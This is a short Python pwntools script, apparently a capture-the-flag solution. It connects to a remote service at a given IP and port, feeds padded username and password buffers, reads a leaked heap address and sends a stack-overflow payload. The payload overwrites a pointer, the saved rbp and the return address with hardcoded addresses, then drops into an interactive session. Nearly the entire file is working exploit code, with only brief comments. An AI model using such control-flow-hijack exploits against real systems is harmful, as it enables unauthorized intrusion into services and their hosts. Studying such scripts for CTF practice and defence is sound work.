from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-l 100']
host = "175.27.251.122"
port = 36118
#io = process('./pwn')
io = remote(host, port)
sl = lambda x: io.sendline(x)
s  = lambda x: io.send(x)
rt = lambda x: io.recvuntil(x)
ri = lambda x: int(io.recv(x), 16)
it = lambda: io.interactive()
p  = lambda x:  pause()
#ret = 0x40129f
#gdb.attach(io,"b *0x4012BF")
user_name = b"admin\x00" + b"A" * (0x40 - 6)
rt("input your name:\n")
s(user_name)
#pause()
pass_wd = b"123456\x00" + b"B" * (0x100 - 7)
rt("input your pasword:\n")
s(pass_wd)
#pause()
rt("chunk_addr: ")
heap_addr = int(io.recvline().strip(), 16)
print("heap_addr: " + hex(heap_addr))
pay = b'a' * 0x48 + p64(heap_addr) + p64(0) + p64(0x40129f) + p64(0x4011a6)    #ptr + rbp +ret_addr
s(pay)
it()
